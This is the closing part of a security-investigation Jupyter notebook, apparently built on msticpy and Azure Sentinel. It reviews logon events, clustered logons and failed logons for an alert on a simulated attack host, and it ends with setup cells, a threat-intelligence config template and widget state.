       "6   52b1ab41-869e-4138-9e40-2a4457f09bf0  WinAttackSim\\AttackAdmin     4624   \n",
       "11  52b1ab41-869e-4138-9e40-2a4457f09bf0  WinAttackSim\\AttackAdmin     4624   \n",
       "15  52b1ab41-869e-4138-9e40-2a4457f09bf0   Font Driver Host\\UMFD-2     4624   \n",
       "0   52b1ab41-869e-4138-9e40-2a4457f09bf0       NT AUTHORITY\\SYSTEM     4624   \n",
       "4   52b1ab41-869e-4138-9e40-2a4457f09bf0  WinAttackSim\\AttackAdmin     4624   \n",
       "\n",
       "             TimeGenerated                      SourceComputerId  \\\n",
       "6  2019-09-11 23:00:37.840  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "11 2019-09-11 23:00:37.840  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "15 2019-09-11 23:00:37.840  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "0  2019-09-11 22:51:37.293  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "4  2019-09-11 23:00:34.263  e72f40cd-a7d2-4a41-8562-3f32da204b36   \n",
       "\n",
       "        Computer SubjectUserName SubjectDomainName SubjectUserSid  \\\n",
       "6   WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "11  WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "15  WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "0   WinAttackSim   WinAttackSim$         WORKGROUP       S-1-5-18   \n",
       "4   WinAttackSim               -                 -        S-1-0-0   \n",
       "\n",
       "   TargetUserName  TargetDomainName  \\\n",
       "6     AttackAdmin      WinAttackSim   \n",
       "11    AttackAdmin      WinAttackSim   \n",
       "15         UMFD-2  Font Driver Host   \n",
       "0          SYSTEM      NT AUTHORITY   \n",
       "4     AttackAdmin      WinAttackSim   \n",
       "\n",
       "                                    TargetUserSid TargetLogonId  \\\n",
       "6   S-1-5-21-3355618666-3700345348-2252427328-500     0x342de3a   \n",
       "11  S-1-5-21-3355618666-3700345348-2252427328-500     0x1caf88b   \n",
       "15                                   S-1-5-96-0-2     0x1ca9c1d   \n",
       "0                                        S-1-5-18         0x3e7   \n",
       "4   S-1-5-21-3355618666-3700345348-2252427328-500     0x3429210   \n",
       "\n",
       "   LogonProcessName  LogonType AuthenticationPackageName Status  \\\n",
       "6           User32           7                 Negotiate          \n",
       "11          User32          10                 Negotiate          \n",
       "15         Advapi            2                 Negotiate          \n",
       "0          Advapi            5                 Negotiate          \n",
       "4          NtLmSsp           3                      NTLM          \n",
       "\n",
       "          IpAddress WorkstationName          TimeCreatedUtc  AccountNum  \\\n",
       "6   131.107.160.233    WinAttackSim 2019-09-12 16:49:13.927        2380   \n",
       "11  131.107.160.233    WinAttackSim 2019-09-11 23:00:38.923        2380   \n",
       "15                -               - 2019-09-11 23:00:37.840        1992   \n",
       "0                 -               - 2019-09-12 21:36:42.550        1484   \n",
       "4   131.107.160.233    JULIANGO-HP2 2019-09-12 16:49:09.167        2380   \n",
       "\n",
       "    LogonHour  Clustered  ClusterId  ClusterSize          FirstEventTime  \\\n",
       "6          16      False         -1            1 2019-09-11 23:00:37.840   \n",
       "11         23      False         -1            1 2019-09-11 23:00:37.840   \n",
       "15         23      False         -1            1 2019-09-11 23:00:37.840   \n",
       "0          21       True          0           15 2019-09-11 22:51:37.293   \n",
       "4          16       True          1            4 2019-09-11 23:00:34.263   \n",
       "\n",
       "             LastEventTime  \n",
       "6  2019-09-12 16:49:13.927  \n",
       "11 2019-09-12 16:49:13.927  \n",
       "15 2019-09-12 16:49:13.927  \n",
       "0  2019-09-12 21:36:42.550  \n",
       "4  2019-09-12 16:49:10.803  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>Account</th>\n",
       "      <th>EventID</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>Computer</th>\n",
       "      <th>SubjectUserSid</th>\n",
       "      <th>SubjectUserName</th>\n",
       "      <th>SubjectDomainName</th>\n",
       "      <th>SubjectLogonId</th>\n",
       "      <th>NewProcessId</th>\n",
       "      <th>NewProcessName</th>\n",
       "      <th>TokenElevationType</th>\n",
       "      <th>ProcessId</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th>ParentProcessName</th>\n",
       "      <th>TargetLogonId</th>\n",
       "      <th>SourceComputerId</th>\n",
       "      <th>TimeCreatedUtc</th>\n",
       "      <th>NodeRole</th>\n",
       "      <th>Level</th>\n",
       "      <th>ProcessId1</th>\n",
       "      <th>NewProcessId1</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "Empty DataFrame\n",
       "Columns: [TenantId, Account, EventID, TimeGenerated, Computer, SubjectUserSid, SubjectUserName, SubjectDomainName, SubjectLogonId, NewProcessId, NewProcessName, TokenElevationType, ProcessId, CommandLine, ParentProcessName, TargetLogonId, SourceComputerId, TimeCreatedUtc, NodeRole, Level, ProcessId1, NewProcessId1]\n",
       "Index: []"
      ]
     },
     "execution_count": 159,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "display(clus_logons.head())\n",
    "process_tree.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 160,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:55:00.299267Z",
     "start_time": "2019-10-31T22:54:59.917941Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span>Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "2450"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Show timeline of events - all events\n",
    "if host_logons is not None and not host_logons.empty:\n",
    "    nbdisplay.display_timeline(data=clus_logons, overlay_data=process_tree, source_columns=['Account'],\n",
    "                             alert=security_alert,\n",
    "                             title='Clustered Host Logons', height=200)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 161,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:55:01.213992Z",
     "start_time": "2019-10-31T22:55:01.184845Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th>LogonCount</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Account</th>\n",
       "      <th>LogonType</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Font Driver Host\\UMFD-2</th>\n",
       "      <th>2</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>NT AUTHORITY\\SYSTEM</th>\n",
       "      <th>5</th>\n",
       "      <td>15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>WinAttackSim\\AttackAdmin</th>\n",
       "      <th>3</th>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Window Manager\\DWM-2</th>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                    LogonCount\n",
       "Account                  LogonType            \n",
       "Font Driver Host\\UMFD-2  2                   1\n",
       "NT AUTHORITY\\SYSTEM      5                  15\n",
       "WinAttackSim\\AttackAdmin 3                   4\n",
       "                         7                   1\n",
       "                         10                  1\n",
       "Window Manager\\DWM-2     2                   2"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Counts of Logon types by Account\n",
    "if host_logons is not None and not host_logons.empty:\n",
    "    display(host_logons[['Account', 'LogonType', 'TimeGenerated']]\n",
    "            .groupby(['Account','LogonType']).count()\n",
    "            .rename(columns={'TimeGenerated': 'LogonCount'}))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "## Failed Logons\n",
    "Failed logons can provide a valuable source of data for investigation so we also want to look at failed logons during the period of our investigation."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 174,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T23:01:25.536263Z",
     "start_time": "2019-10-31T23:01:22.139225Z"
    },
    "hidden": true,
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "<p style=\"font-weight: bold; color: blue;\">No logon failures recorded for this host between 2019-09-12 21:37:27 and 2019-09-12 21:37:27</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "if security_alert.primary_host:\n",
    "    failedLogons = qry_prov.WindowsSecurity.list_host_logon_failures(query_times, security_alert, host_name=security_alert.ExtendedProperties['Compromised Host'])\n",
    "    \n",
    "else:\n",
    "    md_warn(\"No data available - alert has no host entity.\")\n",
    "    failedLogons = None\n",
    "    \n",
    "\n",
    "if failedLogons is None or failedLogons.empty:\n",
    "    md(f'No logon failures recorded for this host between {security_alert.StartTimeUtc} and {security_alert.EndTimeUtc}', styles=[\"bold\",\"blue\"])\n",
    "else:\n",
    "    md('Failed Logons observed for the host:')\n",
    "    display(failedLogons)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "## Appendices\n",
    "### Available DataFrames"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:57:10.081531Z",
     "start_time": "2019-10-31T22:57:10.055277Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "List of current DataFrames in Notebook\n",
      "--------------------------------------------------\n",
      "alert_list\n",
      "alert_counts\n",
      "related_alerts\n",
      "process_tree\n",
      "processes_on_host\n",
      "source_processes\n",
      "ioc_df\n",
      "proc_match_in_ws\n",
      "host_logons\n",
      "failedLogons\n",
      "feature_procs\n",
      "clus_events\n",
      "dec_df\n",
      "ti_results\n",
      "logon_event\n",
      "logon_features\n",
      "clus_logons\n"
     ]
    }
   ],
   "source": [
    "print('List of current DataFrames in Notebook')\n",
    "print('-' * 50)\n",
    "current_vars = list(locals().keys())\n",
    "for var_name in current_vars:\n",
    "    if isinstance(locals()[var_name], pd.DataFrame) and not var_name.startswith('_'):\n",
    "        print(var_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Saving Data to CSV\n",
    "To save the contents of a pandas DataFrame to an CSV\n",
    "use the following syntax\n",
    "```\n",
    "host_logons.to_csv('host_logons.csv')\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "tags": [
     "todo"
    ]
   },
   "source": [
    "### Saving Data to Excel\n",
    "To save the contents of a pandas DataFrame to an Excel spreadsheet\n",
    "use the following syntax\n",
    "```\n",
    "writer = pd.ExcelWriter('myWorksheet.xlsx')\n",
    "my_data_frame.to_excel(writer,'Sheet1')\n",
    "writer.save()\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Setup Cell\n",
    "If you have not run this Notebook before please run this cell before running the rest of the Notebook."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T21:58:18.265424Z",
     "start_time": "2019-10-31T21:58:18.245936Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "All packages are already installed\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "import warnings\n",
    "from msticpy.nbtools.utility import check_and_install_missing_packages\n",
    "\n",
    "from IPython import get_ipython\n",
    "from IPython.display import display, HTML, Markdown\n",
    "import ipywidgets as widgets\n",
    "\n",
    "warnings.filterwarnings(\"ignore\", category=DeprecationWarning)\n",
    "\n",
    "\n",
    "MIN_REQ_PYTHON = (3, 6)\n",
    "if sys.version_info < MIN_REQ_PYTHON:\n",
    "    print(\"Check the Kernel->Change Kernel menu and ensure that Python 3.6\")\n",
    "    print(\"or later is selected as the active kernel.\")\n",
    "    sys.exit(\"Python %s.%s or later is required.\\n\" % MIN_REQ_PYTHON)\n",
    "\n",
    "WIDGET_DEFAULTS = {\n",
    "    \"layout\": widgets.Layout(width=\"95%\"),\n",
    "    \"style\": {\"description_width\": \"initial\"},\n",
    "}\n",
    "\n",
    "# Missing Package installation\n",
    "required_packages = [\"ipwhois\",\"folium\",\"dnspython\"]\n",
    "check_and_install_missing_packages(required_packages)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### `msticpyconfig.yaml` configuration File\n",
    "You can configure primary and secondary TI providers and any required parameters in the `msticpyconfig.yaml` file. This is read from the current directory or you can set an environment variable (`MSTICPYCONFIG`) pointing to its location.\n",
    "\n",
    "Primary providers are used by default. Secondary providers can be invoked by using the `providers` parameter to lookup_ioc or lookup_iocs. `providers` should be a list of strings identifying the provider to use. The provider ID is given by the `Provider:` setting for each of the TI providers.\n",
    "\n",
    "For most providers you will usually need to supply an authorization (API) key and in some cases a user ID for each provider.\n",
    "\n",
    "For LogAnalytics/Azure Sentinel providers, you will need the workspace ID and tenant ID and will need to authenticate in order to access the data (although if you have an existing authenticated connection with the same workspace/tenant, this connection will be re-used). You can use a different workspace for TI from the one you are working in.\n",
    "\n",
    "If you need to create a config file, uncomment the lines in the following cell.\n",
    "\n",
    "**Warning** - this will overwrite a file of the same name in the current directory\n",
    "\n",
    "Delete any provider entries that you do not want to use and add the missing parameters for your providers."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# %%writefile msticpyconfig.yaml\n",
    "\n",
    "# AzureSentinel:\n",
    "#   #Workspaces:\n",
    "#   #  Default:\n",
    "#   #    WorkspaceId: \"52b1ab41-869e-4138-9e40-2a4457f09bf0\"\n",
    "#   #    TenantId: \"4cdf87a8-f0fc-40bb-9d85-68bcf4ac8e61\"\n",
    "#   #  Workspace2:\n",
    "#   #    WorkspaceId: \"c88dd3c2-d657-4eb3-b913-58d58d811a41\"\n",
    "#   #    TenantId: \"4cdf87a8-f0fc-40bb-9d85-68bcf4ac8e61\"\n",
    "#   #  Workspace3:\n",
    "#   #    WorkspaceId: \"17e64332-19c9-472e-afd7-3629f299300c\"\n",
    "#   #    TenantId: \"4ea41beb-4546-4fba-890b-55553ce6003a\"\n",
    "# QueryDefinitions:\n",
    "#   # Uncomment and add paths to folders containing custom query definitions here\n",
    "#   #Custom:\n",
    "#   #  - /home/myuser/queries\n",
    "# TIProviders:\n",
    "#   OTX:\n",
    "#     Args:\n",
    "#       AuthKey: \"your-otx-key\"\n",
    "#     Primary: True\n",
    "#     Provider: \"OTX\" # Explicitly name provider to override\n",
    "#   VirusTotal:\n",
    "#     Args:\n",
    "#       AuthKey: \"your-vt-key\"\n",
    "#     Primary: True\n",
    "#     Provider: \"VirusTotal\"\n",
    "#   XForce:\n",
    "#     # You can store items in an environment variable using this syntax\n",
    "#     Args:\n",
    "#       ApiID:\n",
    "#         EnvironmentVar: \"XFORCE_ID\"\n",
    "#       AuthKey:\n",
    "#         EnvironmentVar: \"XFORCE_KEY\"\n",
    "#     Primary: True\n",
    "#     Provider: \"XForce\"\n",
    "#   AzureSentinel:\n",
    "#     Args:\n",
    "#       # Workspace and tenant where your ThreatIndicator table is\n",
    "#       # - usually the same as your default workspace\n",
    "#       WorkspaceID: \"52b1ab41-869e-4138-9e40-2a4457f09bf0\"\n",
    "#       TenantID: \"4cdf87a8-f0fc-40bb-9d85-68bcf4ac8e61\"\n",
    "#     Primary: True\n",
    "#     Provider: \"AzSTI\""
   ]
  }
 ],
 "metadata": {
  "hide_input": false,
  "kernel_info": {
   "name": "python3"
  },
  "kernelspec": {
   "display_name": "Python 3.6",
   "language": "python",
   "name": "python36"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.6"
  },
  "nteract": {
   "version": "0.15.0"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {
    "height": "318.996px",
    "width": "320.994px"
   },
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": true,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "361px"
   },
   "toc_section_display": true,
   "toc_window_display": true
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "position": {
    "height": "406.193px",
    "left": "1468.4px",
    "right": "20px",
    "top": "120px",
    "width": "456.572px"
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  },
  "widgets": {
   "application/vnd.jupyter.widget-state+json": {
    "state": {
     "02f684add7924a90ba878bbdd99cbed9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "95%"
      }
     },
     "042ba29826d340058fea4f6e32bb69a9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "046425c6a0d14b7a93d711c8de74258d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "04f86b50e7d7452f9d3889359ee61484": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "06a009ef84614c0195feab82b8da0b0c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "06df193c957e42c48c57cf541dc4c802": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "087023f915db4539baf01e5eef0651a0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_3a6eb231c8984762b3e4b9f8063bc165",
        "IPY_MODEL_c1856d7dbe13451e9f92b2861dec081e",
        "IPY_MODEL_abec39d9d82c4c04b1bb4b1615d5894a"
       ],
       "layout": "IPY_MODEL_fd46006994c548abb57223edb579899c"
      }
     },
     "092a1cf9b4a24cd2a6bb76d4d3dc08b9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "0951a96f620444c9816687f964090d08": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "0a337e2269104657a89e5456cedd6288": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_984dbe01577849b0923b3bf81f826218",
        "IPY_MODEL_4ecd51a609044669a8e7e3b114b1c7c8",
        "IPY_MODEL_fdb89df1fd1a43009a9195407b4bda4b"
       ],
       "layout": "IPY_MODEL_5e9a96b2502245fab1ccb1669166e608"
      }
     },
     "0b77b52b7c824ec0ab95d46154444ecc": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_f73a32fa5d794daf82576a888f051caa",
       "style": "IPY_MODEL_a18316a28ac84e94883a5ce50cf87bbd",
       "value": "2019-02-11 05:38:41"
      }
     },
     "0c67b40355cd43d4b32aad2210518845": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "0ccb79571f3a4f009f5cb8dea6c018dc": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "0d81e7a774024054ade46f60277e3e1c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "0e149e64bf2844d7a9162c523498cd95": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "0eaf4482c501451c9e7929a84abac080": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "0f2f980450964310a01dbc26eebd2786": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "80%"
      }
     },
     "0feacac721a4438384b46d78ec29fbeb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SelectModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_options_labels": [
        "2019-09-12 21:37:27  Suspicious Powershell Activity Detected (WINATTACKSIM) [id:2518339765525617422_d7a3b4c4-1794-40d8-bc60-19315106dba3]",
        "2019-09-12 21:37:27  Suspicious Powershell Activity Detected (WINATTACKSIM) [id:00f5bfe2-8f53-4867-b137-783b80127069]",
        "2019-09-12 21:37:27  Suspicious Powershell Activity Detected (WINATTACKSIM) [id:b6e215e2-6c6f-4050-a478-62fedb9d6694]"
       ],
       "_view_module_version": "1.4.0",
       "description": "Select alert :",
       "description_tooltip": null,
       "index": 0,
       "layout": "IPY_MODEL_552acfd67cd84190b9dfe2f5030403d6",
       "style": "IPY_MODEL_213021eed9a84c4b8cce8949c0d0e948"
      }
     },
     "1199de3cc3564fbab2352ef892645f7c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "11b28b5bccec48168bd0973a256fa83d": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_ef9c4292abb74cda96c45e2a0a78c547",
       "outputs": [
        {
         "data": {
          "text/html": "\n            <h3>Alert: 'Suspicious Powershell Activity Detected'</h3><br>time=<b>2019-09-12 21:37:27</b>,\n            entity=<b>WINATTACKSIM</b>, id=<b>2518339765525617422_d7a3b4c4-1794-40d8-bc60-19315106dba3</b>\n            ",
          "text/plain": "<IPython.core.display.HTML object>"
         },
         "metadata": {},
         "output_type": "display_data"
        },
        {
         "data": {
          "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>2202</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>TenantId</th>\n      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n    </tr>\n    <tr>\n      <th>TimeGenerated</th>\n      <td>2019-09-12 21:37:31</td>\n    </tr>\n    <tr>\n      <th>AlertDisplayName</th>\n      <td>Suspicious Powershell Activity Detected</td>\n    </tr>\n    <tr>\n      <th>AlertName</th>\n      <td>Suspicious Powershell Activity Detected</td>\n    </tr>\n    <tr>\n      <th>Severity</th>\n      <td>High</td>\n    </tr>\n    <tr>\n      <th>Description</th>\n      <td>Analysis of host data detected a powershell script running on WINATTACKSIM that has features in ...</td>\n    </tr>\n    <tr>\n      <th>ProviderName</th>\n      <td>Detection</td>\n    </tr>\n    <tr>\n      <th>VendorName</th>\n      <td>Microsoft</td>\n    </tr>\n    <tr>\n      <th>VendorOriginalId</th>\n      <td>d7a3b4c4-1794-40d8-bc60-19315106dba3</td>\n    </tr>\n    <tr>\n      <th>SystemAlertId</th>\n      <td>2518339765525617422_d7a3b4c4-1794-40d8-bc60-19315106dba3</td>\n    </tr>\n    <tr>\n      <th>ResourceId</th>\n      <td>/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/ASIHuntOMSWorkspaceRG/provide...</td>\n    </tr>\n    <tr>\n      